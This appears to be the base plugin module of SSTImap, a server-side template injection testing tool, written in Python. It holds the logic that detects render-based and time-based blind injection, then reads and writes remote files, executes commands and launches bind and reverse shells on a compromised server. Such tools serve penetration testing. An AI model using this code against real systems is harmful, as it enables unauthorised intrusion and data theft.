from utils.strings import chunk_seq, md5
from utils import rand, config
from utils.loggers import log
import re
import itertools
import base64
import collections
import threading
import time
import sys

loaded_plugins = {}
failed_plugins = []


def unload_plugins():
    global loaded_plugins
    global failed_plugins
    for k in loaded_plugins:
        for p in loaded_plugins[k]:
            if p.__module__ in sys.modules:
                del sys.modules[p.__module__]
    loaded_plugins = {}
    for p in failed_plugins:
        if p.__module__ in sys.modules:
            del sys.modules[p.__module__]
    failed_plugins = []


def _recursive_update(d, u):
    # Update value of a nested dictionary of varying depth
    for k, v in u.items():
        if isinstance(d, collections.abc.Mapping):
            if isinstance(v, collections.abc.Mapping):
                r = _recursive_update(d.get(k, {}), v)
                d[k] = r
            else:
                d[k] = u[k]
        else:
            d = {k: u[k]}
    return d


def compatible_url_safe_base64_encode(code):
    code_b64 = code.encode(encoding='UTF-8')
    code_b64 = base64.urlsafe_b64encode(code_b64).decode(encoding='UTF-8')
    return code_b64

def compatible_base64_encode(code):
    code_b64p = code.encode(encoding='UTF-8')
    code_b64p = base64.b64encode(code_b64p).decode(encoding='UTF-8')
    return code_b64p


class Plugin(object):
    generic_plugin = False
    legacy_plugin = False
    extra_plugin = False
    no_tests = False
    priority = 10
    header_type = 'cat'
    sstimap_version = config.version
    plugin_info = {
        "Description": """This plugin has no description.""",
        "Usage notes": "",
        "Authors": [],
        "References": [],
        "Engine": [],
    }

    def __init__(self, channel):
        # HTTP channel
        self.channel = channel
        # Plugin name
        self.plugin = self.__class__.__name__
        # Collect the HTTP response time into a deque to be used to
        # tune the average response time for blind values.
        # Estimate 0.5s for a safe start.
        self.render_req_tm = collections.deque([0.5], maxlen=5)
        # The delay fortime-based blind injection. This will be added 
        # to the average response time for render values.
        self.tm_delay = self.channel.args.get('time_based_blind_delay', 4)
        self.tm_verify_delay = self.channel.args.get('time_based_verify_blind_delay', 30)
        self.tm_varied = False
        # Declare object attributes
        self.actions = {}
        self.contexts = []
        # Call user-defined inits
        self.language_init()
        self.init()

    def __init_subclass__(cls, **kwargs):
        module = cls.__module__.split(".")
        if module[0] == "plugins":
            if config.compare_versions(cls.sstimap_version, config.min_version['plugin']) == "<":
                log.log(22, f'''{cls.__name__} plugin is outdated and cannot be loaded''')
                failed_plugins.append(cls)
                return
            if config.compare_versions(cls.sstimap_version, config.version) == ">":
                log.log(22, f'''{cls.__name__} plugin requires SSTImap update and cannot be loaded''')
                failed_plugins.append(cls)
                return
            if module[1] in loaded_plugins:
                loaded_plugins[module[1]].append(cls)
            else:
                loaded_plugins[module[1]] = [cls]

    def language_init(self):
        # To be overridden. This can call self.update_actions
        # and self.set_contexts
        pass

    def init(self):
        # To be overridden. This can call self.update_actions
        # and self.set_contexts
        pass

    def rendered_detected(self):
        action_evaluate = self.actions.get('evaluate', {})
        test_os_code = action_evaluate.get('test_os')
        test_os_code_expected = action_evaluate.get('test_os_expected')
        if test_os_code and test_os_code_expected:
            os = self.evaluate(test_os_code)
            if os and re.search(test_os_code_expected, os):
                self.set('os', os)
                self.set('evaluate', self.language)
                if self.actions.get('write'):
                    self.set('write', True)
                if self.actions.get('read'):
                    self.set('read', True)
                action_execute = self.actions.get('execute', {})
                test_cmd_code = action_execute.get('test_cmd')
                test_cmd_code_expected = action_execute.get('test_cmd_expected')
                # Using rstrip in case of trailing newline
                if test_cmd_code and test_cmd_code_expected and test_cmd_code_expected == self.execute(test_cmd_code).rstrip():
                    self.set('execute', True)
                    self.set('bind_shell', True)
                    self.set('reverse_shell', True)

    def blind_detected(self):
        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)
        test_cmd_code = self.actions.get('execute', {}).get('test_cmd')
        if test_cmd_code and self.execute_blind(test_cmd_code):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)

    def detect(self):
        # Get user-provided techniques
        techniques = self.channel.args.get('technique')
        # Render technique
        if 'R' in techniques:
            # Start detection
            self._detect_render()
            # If render is not set, check unreliable render
            if self.get('render') is None:
                self._detect_unreliable_render()
            # Else, print and execute rendered_detected()
            else:
                # If here, the rendering is confirmed
                prefix = self.get('prefix', '')
                render = self.get('render', '{code}').format(code='*')
                wrapper = self.get('wrapper', '{code}').format(code=render)
                suffix = self.get('suffix', '')
                log.log(24, f'''{self.plugin} plugin has confirmed injection with tag '{repr(prefix).strip("'")}{repr(wrapper).strip("'")}{repr(suffix).strip("'")}' ''')
                # Clean up any previous unreliable render data
                self.delete('unreliable_render')
                self.delete('unreliable')
                # Set basic info
                self.set('engine', self.plugin.lower())
                self.set('language', self.language)
                # Set the environment
                self.rendered_detected()

        # Time-based blind technique
        if 'T' in techniques:
            # Manage blind injection only if render detection has failed
            if not self.get('engine'):
                self._detect_blind()
                if self.get('blind'):
                    log.log(24, f'{self.plugin} plugin has confirmed blind injection')
                    # Clean up any previous unreliable render data
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # Set basic info
                    self.set('engine', self.plugin.lower())
                    self.set('language', self.language)
                    # Set the environment
                    self.blind_detected()

    def _generate_contexts(self):
        # Loop all the contexts
        for ctx in self.contexts:
            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[0] is not None and ctx.get('level') != int(force_level[0]):
                continue
            # Skip any context which is above the required level
            if not force_level and ctx.get('level') > self.channel.args.get('level'):
                continue
            # The suffix is fixed
            suffix = ctx.get('suffix', '')
            # If the context has no closures, generate one closure with a zero-length string
            wrappers = ctx.get('wrappers', ['{code}'])
            if ctx.get('closures'):
                closures = self._generate_closures(ctx)
            else:
                closures = ['']
            if len(closures)*len(wrappers) > 1:
                log.log(26, f'''{self.plugin} plugin is testing {repr(ctx.get('prefix', '{closure}').format(closure='')).strip("'")}*{repr(suffix).strip("'")} code context escape with {len(closures)*len(wrappers)} variations{f' (level {ctx.get("level", 1)})' if self.get('level') else ''}''')
            for wrapper in wrappers:
                for closure in closures:
                    # Format the prefix with closure
                    prefix = ctx.get('prefix', '{closure}').format(closure=closure)
                    yield prefix, suffix, wrapper

    """
    Detection of unreliable rendering tag with no header and trailer.
    """
    def _detect_unreliable_render(self):
        render_action = self.actions.get('render')
        if not render_action:
            return
        # Print what it's going to be tested
        log.debug(f'{self.plugin} plugin is testing unreliable rendering on text context')
        # Prepare base operation to be evaluated server-side
        expected = render_action.get('test_render_expected')
        payload = render_action.get('test_render')
        # Probe with payload wrapped by header and trailer, no suffix or prefix.
        # Test if contained, since the page contains other garbage
        if expected in self.render(code=payload, header='', trailer='', header_rand=[0,0],
                                   trailer_rand=[0,0], prefix='', suffix=''):
            # Print if the first found unreliable render
            if not self.get('unreliable_render'):
                log.log(25, f"{self.plugin} plugin has detected unreliable rendering with tag "
                            f"{repr(render_action.get('render').format(code='*'))}, skipping")
            self.set('unreliable_render', render_action.get('render'))
            self.set('unreliable', self.plugin)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_blind(self):
        action = self.actions.get('blind', {})
        payload_true = action.get('test_bool_true')
        payload_false = action.get('test_bool_false')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_true or not payload_false or not call_name or not hasattr(self, call_name):
            return
        # Print what it's going to be tested
        log.log(23, f'{self.plugin} plugin is testing blind injection')
        for prefix, suffix, wrapper in self._generate_contexts():
            # Conduct a true-false test
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
                continue
            detail = {'blind_true': self._inject_verbose}
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
                continue
            detail['blind_false'] = self._inject_verbose
            detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
            # We can assume here blind is true
            log.log(28, f'{self.plugin} plugin has detected possible blind injection')
            self.set('blind_test', True)
            # Conduct a true-false test again with bigger delay
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
                self.set('blind_test', False)
                log.log(25, f'Possible blind injection turned out to be false positive')
                continue
            detail = {'blind_true': self._inject_verbose}
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True):
                self.set('blind_test', False)
                log.log(25, f'Possible blind injection turned out to be false positive')
                continue
            self.set('blind_test', False)
            detail['blind_false'] = self._inject_verbose
            detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
            self.set('blind', True)
            self.set('prefix', prefix)
            self.set('suffix', suffix)
            self.set('wrapper', wrapper)
            self.channel.detected('blind', detail)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_render(self):
        render_action = self.actions.get('render')
        if not render_action:
            return
        # Print what it's going to be tested
        log.log(23, f"{self.plugin} plugin is testing rendering with tag "
                    f"{repr(render_action.get('render').format(code='*' ))}")
        for prefix, suffix, wrapper in self._generate_contexts():
            # Prepare base operation to be evaluated server-side
            expected = render_action.get('test_render_expected')
            payload = render_action.get('test_render')
            header_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
            header = render_action.get('header')  # .format(header=header_rand)
            trailer_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
            trailer = render_action.get('trailer')  # .format(trailer=trailer_rand)
            # First probe with payload wrapped by header and trailer, no suffix or prefix
            if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                       trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper):
                self.set('render', render_action.get('render'))
                self.set('header', render_action.get('header'))
                self.set('trailer', render_action.get('trailer'))
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('wrapper', wrapper)
                self.channel.detected('render', {'expected': expected})
                return

    """
    Raw inject of the payload.
    """
    def inject(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        injection = prefix + wrapper.format(code=code) + suffix
        log.debug(f'[request {self.plugin}] {repr(self.channel.url)}')
        # If the request is blind
        if blind:
            expected_delay = self._get_expected_delay()
            start = int(time.time())
            self.channel.req(injection)
            end = int(time.time())
            delta = end - start
            result = delta >= expected_delay
            log.debug(f'[blind {self.plugin}] code above took {str(delta)} ({str(end)}-{str(start)}). '
                      f'{str(expected_delay)} is the threshold, returning {str(result)}')
            self._inject_verbose = {'result': result, 'payload': injection, 'expected_delay': expected_delay,
                                    'start': start, 'end': end}
            return result
        else:
            start = int(time.time())
            result = self.channel.req(injection)
            end = int(time.time())
            # Append the execution time to a buffer
            delta = end - start
            self.render_req_tm.append(delta)
            return result.strip() if result else result

    """
    Inject the rendered payload and get the result.
    
    The request is composed by parameters from:
    
        - Already rendered passed **kwargs, or
        - self.get() to be rendered, or
        - self.actions.get() to be rendered
        
    """
    def render(self, code, **kwargs):
        # If header == '', do not send headers
        header_template = kwargs.get('header')
        header_type = self.header_type
        if header_template != '':
            header_template = kwargs.get('header', self.get('header'))
            if not header_template:
                header_template = self.actions.get('render', {}).get('header')
            if header_template:
                header_rand = kwargs.get('header_rand', self.get('header_rand', [rand.randint_n(10,4), rand.randint_n(10,4)]))
                header = header_template.format(header=header_rand)
        else:
            header_rand = [0, 0]
            header = ''
        # If trailer == '', do not send headers
        trailer_template = kwargs.get('trailer')
        if trailer_template != '':
            trailer_template = kwargs.get('trailer', self.get('trailer'))
            if not trailer_template:
                trailer_template = self.actions.get('render', {}).get('trailer')
            if trailer_template:
                trailer_rand = kwargs.get('trailer_rand', self.get('trailer_rand', [rand.randint_n(10,4), rand.randint_n(10,4)]))
                trailer = trailer_template.format(trailer=trailer_rand)
        else:
            trailer_rand = [0, 0]
            trailer = ''
        # Ensure constant length
        payload_template = kwargs.get('render', self.get('render'))
        if not payload_template:
            payload_template = self.actions.get('render', {}).get('render')
        if not payload_template:
            # Exiting, actions.render.render is not set
            return
        payload = payload_template.format(code=code)
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        injection = wrapper.format(code=header) + wrapper.format(code=payload) + wrapper.format(code=trailer)
        if header_type == "add":
            header_expected = str(sum(header_rand))
            trailer_expected = str(sum(trailer_rand))
        elif header_type == "cat":
            header_expected = "".join([str(x) for x in header_rand])
            trailer_expected = "".join([str(x) for x in trailer_rand])
        else:
            header_expected = ""
            trailer_expected = ""
        # Save the average HTTP request time of rendering in order
        # to better tone the blind request timeouts.
        # Reset wrapper to empty, as it was already applied
        result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix, blind=blind, wrapper="{code}")
        if blind:
            return result_raw
        else:
            result = ''
            # Return result_raw if header and trailer are not specified
            if not header and not trailer:
                return result_raw
            # Cut the result using the header and trailer if specified
            if header:
                before, _, result_after = result_raw.partition(header_expected)
            if trailer and result_after:
                result, _, after = result_after.partition(trailer_expected)
            return result.strip() if result else result

    def set(self, key, value):
        self.channel.data[key] = value

    def get(self, key, default=None):
        return self.channel.data.get(key, default)
        
    def delete(self, key):
        if key in self.channel.data:
            del self.channel.data[key]

    def _generate_closures(self, ctx):
        closures_dict = ctx.get('closures', {'0': []})
        closures = []
        # Loop all the closure names
        for ctx_closure_level, ctx_closure_matrix in closures_dict.items():
            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[1] and ctx_closure_level != int(force_level[1]):
                continue
            # Skip any closure list which is above the required level
            if not force_level and ctx_closure_level > self.channel.args.get('level'):
                continue
            closures += [''.join(x) for x in itertools.product(*ctx_closure_matrix)]
        closures = sorted(set(closures), key=len)
        # Return it
        return closures

    """ Overridable function to get MD5 hash of remote files. """
    def md5(self, remote_path):
        action = self.actions.get('md5', {})
        payload = action.get('md5')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        execution_code = payload.format(path=remote_path)
        result = getattr(self, call_name)(code=execution_code)
        # Check md5 result format
        if re.match(r"([a-fA-F\d]{32})", result):
            return result
        else:
            return None

    """ Overridable function to detect read capabilities. """
    def detect_read(self):
        # Assume read capabilities only if evaluation
        # has been already detected and if self.actions['read'] exits
        if not self.get('evaluate') or not self.actions.get('read'):
            return
        self.set('read', True)

    """ Overridable function to read remote files. """
    def read(self, remote_path):
        action = self.actions.get('read', {})
        payload = action.get('read')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        # Get remote file md5
        md5_remote = self.md5(remote_path)
        if not md5_remote:
            log.log(25, 'Error getting remote file md5, check presence and permission')
            return
        execution_code = payload.format(path=remote_path)
        data_b64encoded = getattr(self, call_name)(code=execution_code)
        data = base64.b64decode(data_b64encoded)
        if not md5(data) == md5_remote:
            log.log(25, 'Remote file md5 mismatch, check manually')
        else:
            log.log(21, 'File downloaded correctly')
        return data

    def write(self, data, remote_path):
        action = self.actions.get('write', {})
        payload_write = action.get('write')
        payload_truncate = action.get('truncate')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_write or not payload_truncate or not call_name or not hasattr(self, call_name):
            return
        # Check existence and overwrite with --force-overwrite
        if self.get('blind') or self.md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                if self.get('blind'):
                    log.log(25, 'Blind upload might overwrite files, run with --force-overwrite to continue')
                else:
                    log.log(25, 'Remote file already exists, run with --force-overwrite to overwrite')
                return
            else:
                execution_code = payload_truncate.format(path=remote_path)
                getattr(self, call_name)(code=execution_code)
        # Upload file in chunks of 500 characters
        for chunk in chunk_seq(data, 500):
            log.debug(f'[b64 encoding] {chunk}')
            chunk_b64 = base64.urlsafe_b64encode(chunk)
            chunk_b64p = base64.b64encode(chunk)
            lens = {
                'path': len(remote_path),
                'clen': len(chunk),
                'clen64': len(chunk_b64),
                'clen64p': len(chunk_b64p)
            }
            execution_code = payload_write.format(path=remote_path, chunk_b64=chunk_b64, chunk_b64p=chunk_b64p, lens=lens)
            getattr(self, call_name)(code=execution_code)
        if self.get('blind'):
            log.log(25, 'Blind upload can\'t check the upload correctness, check manually')
        elif not md5(data) == self.md5(remote_path):
            log.log(25, 'Remote file md5 mismatch, check manually')
        else:
            log.log(21, 'File uploaded correctly')

    def evaluate(self, code,  **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        action = self.actions.get('evaluate', {})
        payload = action.get('evaluate')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        if '{code_b64}' in payload:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p)
        }
        execution_code = payload.format(code_b64=code_b64, code=code, code_b64p=code_b64p, lens=lens)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=blind)

    def execute(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        action = self.actions.get('execute', {})
        payload = action.get('execute')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        if '{code_b64}' in payload:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p)
        }
        execution_code = payload.format(code_b64=code_b64, code_b64p=code_b64p, code=code, lens=lens)
        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=blind)
        return result.replace('\\n', '\n') if type(result) == str else result

    def evaluate_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        action = self.actions.get('evaluate_blind', {})
        payload_action = action.get('evaluate_blind')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        expected_delay = self._get_expected_delay()
        if '{code_b64}' in payload_action:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload_action:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p),
            'delay': len(str(expected_delay))
        }
        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                               code_b64p=code_b64p, code=code, delay=expected_delay)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True)

    def execute_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        action = self.actions.get('execute_blind', {})
        payload_action = action.get('execute_blind')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        expected_delay = self._get_expected_delay()
        if '{code_b64}' in payload_action:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload_action:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p),
            'delay': len(str(expected_delay))
        }
        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                               code_b64p=code_b64p, code=code, delay=expected_delay)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix, wrapper=wrapper, blind=True)

    def _get_expected_delay(self):
        # Get current average timing for render() HTTP requests
        average = int(sum(self.render_req_tm) / len(self.render_req_tm))
        dev = [x - average for x in self.render_req_tm]
        varydev = max(dev) + abs(min(dev))
        # Set delay to 2 second over the average timing
        delay = self.tm_delay if not self.get('blind_test', False) else self.tm_verify_delay
        if not self.tm_varied and varydev > delay:
            self.tm_varied = True
            log.log(29, "Blind injection timing varies too much. Increase the timing to avoid false positives.")
        return average + delay

    def bind_shell(self, port, shell="/bin/sh"):
        action = self.actions.get('bind_shell', {})
        payload_actions = action.get('bind_shell')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = payload_action.format(port=port, shell=shell)
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()
            yield reqthread

    def reverse_shell(self, host, port, shell="/bin/sh"):
        action = self.actions.get('reverse_shell', {})
        payload_actions = action.get('reverse_shell')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = payload_action.format(port=port, shell=shell, host=host)
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()

    def update_actions(self, actions):
        # Recursively update actions on the instance
        self.actions = _recursive_update(self.actions, actions)

    def set_actions(self, actions):
        # Set actions on the instance
        self.actions = actions

    def set_contexts(self, contexts):
        # Update contexts on the instance
        self.contexts = contexts
